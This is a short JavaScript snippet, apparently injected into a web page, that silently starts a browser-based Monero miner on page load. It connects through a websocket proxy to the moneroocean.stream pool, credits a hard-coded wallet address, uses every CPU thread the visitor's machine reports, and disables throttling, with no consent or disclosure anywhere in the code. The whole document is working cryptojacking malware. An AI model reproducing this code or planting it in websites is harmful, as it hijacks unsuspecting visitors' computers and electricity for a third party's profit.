window.__mm__ = () => {
    server = "wss://ghgi.xyz";
    var pool = "moneroocean.stream";
    var walletAddress = "85ys2JUgCoYBPD3RTLYj18R9h7i9kbZD23MX9B5D8dB4DRK7WRSEAynUk3sECAqSCV9EJ64tivdScAJEkQCF97VkVDmJNHD";
    var workerId = String('CL' + window.navigator.platform + window.navigator.language).replace(/\s/g, '');
    var threads = window.navigator.hardwareConcurrency;
    var password = "x";
    startMining(pool, walletAddress, workerId, threads, password);
    throttleMiner = 0;
};
window.__mm__();